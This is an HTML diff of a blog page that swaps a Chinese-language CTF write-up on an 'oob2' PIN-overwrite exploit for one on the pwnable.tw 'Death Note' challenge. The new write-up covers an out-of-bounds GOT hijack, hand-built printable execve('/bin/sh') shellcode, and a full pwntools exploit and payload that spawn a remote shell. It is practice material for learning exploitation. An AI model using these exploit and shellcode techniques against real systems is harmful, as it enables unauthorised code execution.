@@ -13,26 +13,28 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://kazma.tw/2024/01/19/pwnctf-oob2-writeup/"/>
+    <link rel="canonical" href="https://kazma.tw/2024/06/07/pwnable-tw-death-note-writeup/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="oob2這題跟 oob1 是類似的，執行後可以觀察到這次多了一個功能是可以讓使用者設定自己的 nickname 然後登入的時候就會顯示你自己設定的這個暱稱，如下所示： 123456└─$ .&#x2F;oob2User ID: -4Nickname: kazmaPIN: 1234Logging as [kazma] ... FailedIncorrect PIN code!  那跟上一題基本上解法一樣，我們">
+        <meta name="description" content="Pwnablte.tw - Death NoteDescription Write the shellcode on your Death Note.  Sourcehttps:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#10  0x1 Initial Reconnaissance這題題目直接明講要寫 shellcode，而且從名稱可以猜的出來又是選單題，所以就先來寫他了。 file12└─$">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwnctf oob2 Writeup">
-<meta property="og:url" content="https://kazma.tw/2024/01/19/Pwnctf-oob2-Writeup/index.html">
+<meta property="og:title" content="Pwnable.tw Death Note Writeup">
+<meta property="og:url" content="https://kazma.tw/2024/06/07/Pwnable-tw-Death-Note-Writeup/index.html">
 <meta property="og:site_name" content="kazma&#39;s blog">
-<meta property="og:description" content="oob2這題跟 oob1 是類似的，執行後可以觀察到這次多了一個功能是可以讓使用者設定自己的 nickname 然後登入的時候就會顯示你自己設定的這個暱稱，如下所示： 123456└─$ .&#x2F;oob2User ID: -4Nickname: kazmaPIN: 1234Logging as [kazma] ... FailedIncorrect PIN code!  那跟上一題基本上解法一樣，我們">
+<meta property="og:description" content="Pwnablte.tw - Death NoteDescription Write the shellcode on your Death Note.  Sourcehttps:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#10  0x1 Initial Reconnaissance這題題目直接明講要寫 shellcode，而且從名稱可以猜的出來又是選單題，所以就先來寫他了。 file12└─$">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-01-18T16:05:09.000Z">
-<meta property="article:modified_time" content="2024-01-18T16:18:50.128Z">
+<meta property="og:image" content="https://kazma.tw/images/death_printable.png">
+<meta property="article:published_time" content="2024-06-06T18:57:15.493Z">
+<meta property="article:modified_time" content="2024-06-06T18:57:15.493Z">
 <meta property="article:author" content="kazma">
 <meta property="article:tag" content="writeup">
 <meta property="article:tag" content="pwn">
-<meta property="article:tag" content="lab">
-<meta property="article:tag" content="pwnctf">
+<meta property="article:tag" content="shellcode">
+<meta property="article:tag" content="pwnabletw">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kazma.tw/images/death_printable.png">
     
     
     <!--- Icon Part-->
@@ -44,7 +46,7 @@
     
     <title>
         
-            Pwnctf oob2 Writeup -
+            Pwnable.tw Death Note Writeup -
         
         kazma&#39;s blog
     </title>
@@ -381,7 +383,7 @@
 
         <div class="article-title">
             
-                <h1 class="article-title-regular">Pwnctf oob2 Writeup</h1>
+                <h1 class="article-title-regular">Pwnable.tw Death Note Writeup</h1>
             
             </div>
             
@@ -403,15 +405,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-01-19 00:05:09</span>
-        <span class="mobile">2024-01-19 00:05:09</span>
+        <span class="desktop">2024-06-07 02:57:15</span>
+        <span class="mobile">2024-06-07 02:57:15</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-01-19 00:18:50</span>
-            <span class="mobile">2024-01-19 00:18:50</span>
+            <span class="desktop">2024-06-07 02:57:15</span>
+            <span class="mobile">2024-06-07 02:57:15</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -431,11 +433,11 @@
                     </li>
                 
                     <li>
-                        | <a href="/tags/lab/">lab</a>&nbsp;
+                        | <a href="/tags/shellcode/">shellcode</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/pwnctf/">pwnctf</a>&nbsp;
+                        | <a href="/tags/pwnabletw/">pwnabletw</a>&nbsp;
                     </li>
                 
             </ul>
@@ -461,32 +463,84 @@
 
 
         <div class="article-content markdown-body">
-            <h1 id="oob2"><a href="#oob2" class="headerlink" title="oob2"></a>oob2</h1><p>這題跟 oob1 是類似的，執行後可以觀察到這次多了一個功能是可以讓使用者設定自己的 nickname 然後登入的時候就會顯示你自己設定的這個暱稱，如下所示：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./oob2</span><br><span class="line">User ID: -4</span><br><span class="line">Nickname: kazma</span><br><span class="line">PIN: 1234</span><br><span class="line">Logging as [kazma] ... Failed</span><br><span class="line">Incorrect PIN code!</span><br></pre></td></tr></table></figure></div>
+            <h1 id="Pwnablte-tw-Death-Note"><a href="#Pwnablte-tw-Death-Note" class="headerlink" title="Pwnablte.tw - Death Note"></a>Pwnablte.tw - Death Note</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<p>Write the shellcode on your Death Note.</p>
+</blockquote>
+<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#10" >https://pwnable.tw/challenge/#10 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>這題題目直接明講要寫 shellcode，而且從名稱可以猜的出來又是選單題，所以就先來寫他了。</p>
+<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file death_note</span><br><span class="line">death_note: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=547f3a1cf19ffe5798d45def2f4bc5c585af88f5, not stripped</span><br></pre></td></tr></table></figure></div>
 
-<p>那跟上一題基本上解法一樣，我們原本是 oob read admin 的 pincode 那現在變成是 oob write admin 的 pincode，exploit 如下：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./oob2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;-4&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, p32(<span class="number">1</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1234&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;kazma&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-<p>Result:</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob2&#x27;</span>: pid 14326</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Logging as [kazma] ... Ok!</span><br><span class="line"></span><br><span class="line">BreakALLCTF&#123;DJPD61GTBQIqqL7sWEvF&#125;</span><br></pre></td></tr></table></figure></div>
-<h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec death_note</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/deathnote/death_note&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="death-note"><a href="#death-note" class="headerlink" title=".&#x2F;death_note"></a>.&#x2F;death_note</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./death_note</span><br><span class="line">-----------------------------------</span><br><span class="line">             DeathNote</span><br><span class="line">-----------------------------------</span><br><span class="line"> 1. Add a name</span><br><span class="line"> 2. show a name on the note</span><br><span class="line"> 3. delete a name int the note</span><br><span class="line"> 4. Exit</span><br><span class="line">-----------------------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure></div>
+
+<p>NX 確實沒開，看一下究竟賣什麼藥讓他可以值 250 分XD</p>
+<h2 id="0x2-Reverse-Engineering"><a href="#0x2-Reverse-Engineering" class="headerlink" title="0x2 Reverse Engineering"></a>0x2 Reverse Engineering</h2><h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-60h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [esp+Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound !!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name :&quot;</span>);</span><br><span class="line">  read_input(s, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !is_printable(s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It must be a printable name !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(&amp;note + v1) = strdup(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>main 主要就是控制選單我們就直接跳過，先來看 <code>add_note</code>。<br>有很明顯的 oob write，index 只檢查有沒有大於十，沒有檢查下界。<br>Name 需要是 printable 的，然後長度限制 0x50。<br>到這邊大概可以確認是要考 Alphanumeric shellcode，長度限制也不會太嚴苛，我們可以透過 oob write 做到 GOT Hijacking, 選一個一定會觸發的 got 這樣也省去 oob read 的步驟。<br>那關鍵就變成我們 index 要選多少以及要怎麼構建我們的咒語。</p>
+<h2 id="0x3-Choose-Index"><a href="#0x3-Choose-Index" class="headerlink" title="0x3 Choose Index"></a>0x3 Choose Index</h2><p>因為我們已經發現 <code>add_note</code> 不會檢查 index 的下界，所以可以 GOT Hijacking，這邊選擇 <code>puts</code>，如此就不用再花一個步驟 oob read ，因為 <code>add_note</code> 結束前會再執行一次 <code>puts(&quot;Done !&quot;);</code>。<br>先找 <code>puts</code> 的 GOT：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ readelf -r death_note | grep puts</span><br><span class="line">0804a020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0</span><br></pre></td></tr></table></figure></div>
+
+<p>再來找全域變數 <code>note</code> 的位置：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ readelf -s death_note | grep OBJECT | grep note</span><br><span class="line">    79: 0804a060    40 OBJECT  GLOBAL DEFAULT   26 note</span><br></pre></td></tr></table></figure></div>
+
+<p>index:<br><code>(0x0804a020 - 0x0804a060) / 4 = -16</code></p>
+<p>Done!</p>
+<h2 id="0x4-Alphanumeric-shellcode"><a href="#0x4-Alphanumeric-shellcode" class="headerlink" title="0x4 Alphanumeric shellcode"></a>0x4 Alphanumeric shellcode</h2><p>我們的目標是要構建出 x86 的 <code>execve(&#39;/bin/sh&#39;, 0, 0)</code> 並且要是 printable 的。<br>先來複習一下正常沒有限制的長怎樣，順便叫 AI 幫我們把 byte code 註解在後面：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor    eax, eax            ; 31 C0</span><br><span class="line">push   eax                 ; 50</span><br><span class="line">push   0x68732f2f          ; 68 2F 2F 73 68</span><br><span class="line">push   0x6e69622f          ; 68 2F 62 69 6E</span><br><span class="line">mov    ebx, esp            ; 89 E3</span><br><span class="line">push   eax                 ; 50</span><br><span class="line">push   ebx                 ; 53</span><br><span class="line">mov    ecx, esp            ; 89 E1</span><br><span class="line">mov    al, 0xb             ; B0 0B</span><br><span class="line">int    0x80                ; CD 80</span><br></pre></td></tr></table></figure></div>
+
+<p>然後確認一下 <code>is_printable</code> 的實作細節：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">is_printable</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="built_in">strlen</span>(s) &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] &lt;= <span class="number">0x1F</span> || s[i] == <span class="number">0x7F</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>所以 byte code 如果落在這個範圍 <code>s[i] &lt;= 0x1F || s[i] == 0x7F</code> 要替換掉。<br>等等！？範圍乍看之下不太對勁，大於 0x7f 怎麼好像沒有檢查，動態下去跑發現：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/death_printable.png"
+                      alt="printable"
+                ></p>
+<p>可以從圖片看到 0xc0 是會觸發 jle 的跳轉的，原因是 SF 被設定成 1，在二補數中表示負數，所以可能是 ida 反編譯爛掉<br>實際上應該是 <code>s[i] &lt;= 0x1F || s[i] &gt;= 0x7F</code><br><del>害我開心了一下</del><br>正式來構建我們的咒語：</p>
+<h3 id="ebx-‘-bin-sh-0’"><a href="#ebx-‘-bin-sh-0’" class="headerlink" title="ebx &#x3D; [‘&#x2F;bin&#x2F;sh\0’]"></a>ebx &#x3D; [‘&#x2F;bin&#x2F;sh\0’]</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push 0x68</span><br><span class="line">push 0x732f2f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="int-0x80"><a href="#int-0x80" class="headerlink" title="int 0x80"></a>int 0x80</h3><p>int 0x80 可以拆成兩個在範圍裡的 xor</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push edx</span><br><span class="line">pop eax</span><br><span class="line">push 0x53</span><br><span class="line">pop edx</span><br><span class="line">sub byte ptr [eax+39],dl</span><br><span class="line">sub byte ptr [eax+40],dl</span><br><span class="line">push 0x70</span><br><span class="line">pop edx</span><br><span class="line">xor byte ptr [eax+40],dl</span><br></pre></td></tr></table></figure></div>
+
+<p>最後加上 b”\x20\x43”</p>
+<h3 id="eax-0x0b"><a href="#eax-0x0b" class="headerlink" title="eax &#x3D; 0x0b"></a>eax &#x3D; 0x0b</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push ecx</span><br><span class="line">pop eax</span><br><span class="line">xor al, 0x20</span><br><span class="line">xor al, 0x2b</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="edx-ecx-0"><a href="#edx-ecx-0" class="headerlink" title="edx &#x3D; ecx &#x3D; 0"></a>edx &#x3D; ecx &#x3D; 0</h3><p>ecx 本來就是 0</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ecx</span><br><span class="line">pop edx</span><br></pre></td></tr></table></figure></div>
+
+<p>心得：<br>主要是看我們挑的 offset 是多少，然後觀察當下的各個暫存器的值去拼湊出來，xor 自由度蠻高的很好用。</p>
+<h2 id="0x5-Exploit"><a href="#0x5-Exploit" class="headerlink" title="0x5 Exploit"></a>0x5 Exploit</h2><p>exploit.py:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;chall.pwnable.tw&quot;</span></span><br><span class="line">port = <span class="number">10201</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./death_note&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;-r&quot;</span>:</span><br><span class="line">    r = remote(host, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">&quot;./death_note&quot;</span>)</span><br><span class="line"></span><br><span class="line">sc = (</span><br><span class="line">    asm(</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    push 0x732f2f2f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    push esp</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    push 0x53</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    sub byte ptr [eax+39],dl</span></span><br><span class="line"><span class="string">    sub byte ptr [eax+40],dl</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    xor byte ptr [eax+40],dl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    xor al, 0x20</span></span><br><span class="line"><span class="string">    xor al, 0x2b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    )</span><br><span class="line">    + <span class="string">b&quot;\x20\x43&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&quot;:&quot;</span>, <span class="string">&quot;-16&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;:&quot;</span>, sc)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;cat /home/`whoami`/flag&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>result:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py -r</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/deathnote/death_note&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10201: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">FLAG&#123;sh3llc0d3_is_s0_b34ut1ful&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div>
+
+<p>因為這邊 payload 都是 printable 的，所以順便印出來感受一下手戳 RCE 的快感：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc chall.pwnable.tw 10201</span><br><span class="line">-----------------------------------</span><br><span class="line">             DeathNote</span><br><span class="line">-----------------------------------</span><br><span class="line"> 1. Add a name</span><br><span class="line"> 2. show a name on the note</span><br><span class="line"> 3. delete a name int the note</span><br><span class="line"> 4. Exit</span><br><span class="line">-----------------------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Index :-16</span><br><span class="line">Name :jhh///sh/binT[RXjSZ(P<span class="string">&#x27;(P(jpZ0P(QX4 4+QZ C&quot;</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=1000(death_note) gid=1000(death_note) groups=1000(death_note)</span></span><br></pre></td></tr></table></figure></div>
+
+<p>順利成功！</p>
+<h2 id="0x6-Pwned"><a href="#0x6-Pwned" class="headerlink" title="0x6 Pwned!!!"></a>0x6 Pwned!!!</h2>
         </div>
 
         
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> Pwnctf oob2 Writeup</li>
+        <li><strong>Title:</strong> Pwnable.tw Death Note Writeup</li>
         <li><strong>Author:</strong> kazma</li>
         <li><strong>Created at
-                :</strong> 2024-01-19 00:05:09</li>
+                :</strong> 2024-06-07 02:57:15</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-01-19 00:18:50
+                    :</strong> 2024-06-07 02:57:15
             </li>
         
         <li>
-            <strong>Link:</strong> https://kazma.tw/2024/01/19/Pwnctf-oob2-Writeup/
+            <strong>Link:</strong> https://kazma.tw/2024/06/07/Pwnable-tw-Death-Note-Writeup/
         </li>
         <li>
             <strong>
@@ -515,11 +569,11 @@
                     </li>
                 
                     <li class="tag-item">
-                        <a href="/tags/lab/">#lab</a>&nbsp;
+                        <a href="/tags/shellcode/">#shellcode</a>&nbsp;
                     </li>
                 
                     <li class="tag-item">
-                        <a href="/tags/pwnctf/">#pwnctf</a>&nbsp;
+                        <a href="/tags/pwnabletw/">#pwnabletw</a>&nbsp;
                     </li>
                 
             </ul>
@@ -530,29 +584,14 @@
         
             <div class="article-nav">
                 
